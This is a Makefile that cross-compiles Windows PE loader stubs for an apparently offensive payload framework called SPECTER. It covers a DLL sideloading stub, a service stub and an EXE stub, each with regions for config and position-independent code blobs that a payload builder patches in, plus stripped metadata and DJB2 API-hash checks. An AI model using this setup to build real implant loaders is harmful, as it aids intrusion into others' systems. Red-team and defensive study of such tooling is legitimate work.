# SPECTER Stubs Build System
# Cross-compilation of PE template stubs using MinGW-w64
#
# Produces pre-compiled PE stubs with config + PIC blob marker regions
# that the PayloadBuilder patches at build time.

CC      = x86_64-w64-mingw32-gcc
STRIP   = x86_64-w64-mingw32-strip

# CRT-free, no stdlib, position-independent, optimized for size
CFLAGS  = -Wall -Werror -Os -std=c11 \
          -nostdlib -nostdinc -ffreestanding \
          -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables \
          -fpack-struct=8 -masm=intel -mno-stack-arg-probe \
          -DWIN32_LEAN_AND_MEAN \
          -I.

ifdef DETACHED_HOLD
  CFLAGS += -DSPECTER_STUB_DETACHED_HOLD
endif

# Linker flags common to all stubs
LDFLAGS_COMMON = -nostdlib -Wl,--no-dynamic-linker -Wl,--no-seh

# Output directory (stubs are also copied to ../build/ for PayloadBuilder)
BUILD_DIR = ../build

.PHONY: all clean verify-hashes

all: $(BUILD_DIR)/sideload_stub.dll $(BUILD_DIR)/service_stub.exe $(BUILD_DIR)/dotnet_stub.exe
	@printf "detached_hold=%s\n" "$(if $(DETACHED_HOLD),1,0)" > $(BUILD_DIR)/stub.features
	@echo "=== Stub build complete ==="
	@echo "  sideload_stub.dll"
	@echo "  service_stub.exe"
	@echo "  dotnet_stub.exe"

# ---- DLL sideloading stub ----
# Entry: DllMain, shared library
$(BUILD_DIR)/sideload_stub.dll: sideload_stub.c stub_common.h
	$(CC) $(CFLAGS) -shared \
	    -Wl,-e,DllMain \
	    $(LDFLAGS_COMMON) \
	    -o $@ sideload_stub.c
	-$(STRIP) --strip-debug $@

# ---- Windows service EXE stub ----
# Entry: ServiceEntry
$(BUILD_DIR)/service_stub.exe: service_stub.c stub_common.h
	$(CC) $(CFLAGS) \
	    -Wl,-e,ServiceEntry \
	    $(LDFLAGS_COMMON) \
	    -Wl,--subsystem,console \
	    -o $@ service_stub.c
	-$(STRIP) --strip-debug $@

# ---- Native EXE stub (dotnet format slot) ----
# Entry: WinMainCRTStartup
$(BUILD_DIR)/dotnet_stub.exe: dotnet_stub.c stub_common.h
	$(CC) $(CFLAGS) \
	    -Wl,-e,WinMainCRTStartup \
	    $(LDFLAGS_COMMON) \
	    -Wl,--subsystem,console \
	    -o $@ dotnet_stub.c
	-$(STRIP) --strip-debug $@

verify-hashes:
	@echo "=== DJB2 Hash Verification ==="
	@python3 compute_hashes.py

clean:
	rm -f $(BUILD_DIR)/sideload_stub.dll $(BUILD_DIR)/service_stub.exe $(BUILD_DIR)/dotnet_stub.exe
